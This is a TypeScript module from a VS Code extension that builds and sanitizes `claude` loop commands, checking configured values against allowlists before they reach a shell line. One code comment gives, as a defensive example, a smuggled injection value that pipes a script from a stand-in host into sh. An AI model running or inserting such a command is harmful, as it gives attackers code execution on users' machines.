// Pure loop-command builder. No vscode imports so it is unit-testable in Docker.
import {
  LoopId, LOOPS, TaskDefaults, TASK_DEFAULTS, isModel, isModelValue, isEffortValue, isReviewerValue,
  isValidEffort, sanitizeGroomConcurrency,
} from './model';

// Allowlist for `--permission-mode`, mirroring the `loopBoard.permissionMode` enum in package.json.
// This value is spliced UNQUOTED into the loop terminal shell command (buildClaudeBase). package.json's
// enum only constrains the Settings UI — a repo-supplied `.vscode/settings.json` can set it to any
// string (e.g. `auto; curl evil.sh | sh`), which would execute when the user starts a loop. So the
// value MUST be validated before it reaches the shell line; an off-list value falls back to 'auto'.
export const PERMISSION_MODES = ['auto', 'acceptEdits', 'bypassPermissions', 'dontAsk', 'default', 'plan'];
export function isValidPermissionMode(s: string): boolean {
  return PERMISSION_MODES.indexOf(s) !== -1;
}
export function sanitizePermissionMode(s: string): string {
  return isValidPermissionMode(s) ? s : 'auto';
}

// The loop interval rides into the `/loop <interval> …` bootstrap prompt (buildLoopCommand). Restrict
// it to a plain <digits><unit> token so a settings-supplied value can't smuggle anything else onto the
// line. Units s/m/h/d match the /loop skill; an invalid value falls back to '1m'.
const LOOP_INTERVAL_RE = /^\d+[smhd]$/;
export function isValidLoopInterval(s: string): boolean {
  return LOOP_INTERVAL_RE.test(s);
}
export function sanitizeLoopInterval(s: string): string {
  return isValidLoopInterval(s) ? s : '1m';
}

// Build the `claude …` invocation prefix (everything before the /loop prompt argv). The resolved
// `--model` string is configurable (`loopBoard.orchestrator.model`) and may contain shell glob
// metacharacters (`[` `]`, e.g. `opus[1m]`), so it MUST be single-quoted, otherwise zsh tries to
// glob-expand it and aborts with "no matches found". The string is pre-validated
// (isValidModelString) to contain no single quote, so a plain single-quote wrap is safe.
// permissionMode is spliced unquoted, so it is sanitized to the package.json enum here (invalid ->
// 'auto'); never trust a raw config value on the shell line.
//
// `sessionName` (t-2b89) is `--name loopboard-<loop>-<suffix>`: the ONLY thing that tells this
// loop's Claude session from any other in `~/.claude/sessions/*.json` (the session file records no
// ppid). It is derived from the fixed loop id, never from configuration, so it needs no quoting or
// escaping. Preferred over pinning `--session-id` because `/clear` starts a NEW session id in the
// same process: the name survives, the id does not.
//
// `effort` (t-cffc) is `loopBoard.orchestrator.effort`, passed as `--effort <level>` on EVERY
// spawn, the loop session's reasoning effort only; each subagent gets its effort per spawn.
// Spliced unquoted, so it is validated against EFFORT_LEVELS here (invalid/absent -> 'medium'),
// the same hardening as permissionMode — a raw config value never reaches the shell line.
export function buildClaudeBase(permissionMode: string, modelString: string, sessionName?: string, effort?: string): string {
  const name = sessionName ? ` --name ${sessionName}` : '';
  const level = typeof effort === 'string' && isValidEffort(effort) ? effort : 'medium';
  return `claude --permission-mode ${sanitizePermissionMode(permissionMode)} --model '${modelString}' --effort ${level}${name}`;
}

// What the orchestrator's bootstrap prompt carries besides the interval (t-0e99). Sync copies
// LOOP.md's marked blocks byte for byte with no interpolation, so LOOP.md can carry the BEHAVIOUR
// but never a configured value: the cap, the enabled task models and the five defaults ride here.
export interface LoopPromptConfig {
  groomConcurrency?: number;
  models: readonly string[]; // enabled task model ids, in display order
  defaults: TaskDefaults;
}

// Build the tiny bootstrap prompt pasted into the orchestrator's terminal: it names the role, the
// interval, the grooming cap, the enabled task models and the defaults; the loop reads the full
// standing instructions from `.loopboard/LOOP.md`'s ## Automation section on every pass (so editing
// that section retunes a running loop). Effort is NOT here (t-cffc): it is a `claude --effort`
// startup flag (buildClaudeBase). It names NO model of its own: a prompt saying "You are running
// as model ..." is the legacy per-model loop the template's guard tells to stand down.
//
// Every value is spliced into a single-quoted shell argv, so each one is re-validated against its
// allowlist here (a hostile setting falls back to the shipped default) and the result stays
// apostrophe-free and under 300 chars.
//
// LOOP.md contains several fenced blocks (layout, workflow, grammars), so we must NOT grab the
// first fence: slice from the `## Automation` heading to the next `## ` heading (or EOF), and
// require a fenced block inside that slice. No block -> undefined (caller warns).
export function buildLoopCommand(loopText: string, interval: string, cfg: LoopPromptConfig): string | undefined {
  const lines = loopText.split('\n');
  let start = -1;
  for (let i = 0; i < lines.length; i++) {
    if (/^##\s+Automation\b/i.test(lines[i])) {
      start = i;
      break;
    }
  }
  if (start < 0) return undefined;
  let end = lines.length;
  for (let i = start + 1; i < lines.length; i++) {
    if (/^##\s+/.test(lines[i])) {
      end = i;
      break;
    }
  }
  const section = lines.slice(start, end).join('\n');
  if (!/```[^\n]*\n[\s\S]*?```/.test(section)) return undefined;

  const groomCap = sanitizeGroomConcurrency(cfg.groomConcurrency);
  const models = (cfg.models || []).filter(isModel);
  const d = cfg.defaults || TASK_DEFAULTS;
  const pick = <T>(v: unknown, ok: (x: unknown) => x is T, dflt: T): T => (ok(v) ? v : dflt);
  const groomer = pick(d.groomer, isModelValue, TASK_DEFAULTS.groomer);
  const groomerEffort = pick(d.groomerEffort, isEffortValue, TASK_DEFAULTS.groomerEffort);
  const worker = pick(d.worker, isModelValue, TASK_DEFAULTS.worker);
  const workerEffort = pick(d.workerEffort, isEffortValue, TASK_DEFAULTS.workerEffort);
  const reviewer = pick(d.reviewer, isReviewerValue, TASK_DEFAULTS.reviewer);
  return (
    `/loop ${sanitizeLoopInterval(interval)} You are the LoopBoard orchestrator with a grooming concurrency cap of ${groomCap}. ` +
    `Task models: ${models.length ? models.join(', ') : 'none'}. ` +
    `Defaults: groomer ${groomer} effort ${groomerEffort}, worker ${worker} effort ${workerEffort}, reviewer ${reviewer}. ` +
    `Follow the Automation section of .loopboard/LOOP.md exactly on every pass.`
  );
}

// The terminal a loop runs in (t-0e99): `Claude Orchestrator`. The ONLY terminal name LoopBoard
// creates; the per-model `Claude <Model>` terminals are legacy.
export function loopTerminalName(loop: LoopId): string {
  const label = LOOPS.find((l) => l.id === loop)?.label ?? loop;
  return 'Claude ' + label;
}

// Names of the per-model loop terminals LoopBoard used to open, one per slot. VSCode can revive a
// terminal across a reload, so these may still be running the old per-model loop after the
// update; activation offers to stop them (t-0e99).
export const LEGACY_LOOP_TERMINALS = ['Claude Opus', 'Claude Sonnet', 'Claude Fable'];

export function legacyLoopTerminals(names: readonly string[]): string[] {
  return names.filter((n) => LEGACY_LOOP_TERMINALS.includes(n));
}

// Loop-row click decision (t-9c3f). The row that last revealed its terminal toggles the whole
// bottom panel (`workbench.action.togglePanel`, the command ⌘J runs), so each click flips the
// panel's REAL state even after an external ⌘J hide/show; any other row (or nothing revealed yet)
// shows its own terminal. VS Code exposes no panel-visibility API, so the toggle is the only way to
// act on the actual state rather than a cached guess.
export function revealStep(revealed: LoopId | undefined, loop: LoopId): 'togglePanel' | 'show' {
  return revealed === loop ? 'togglePanel' : 'show';
}
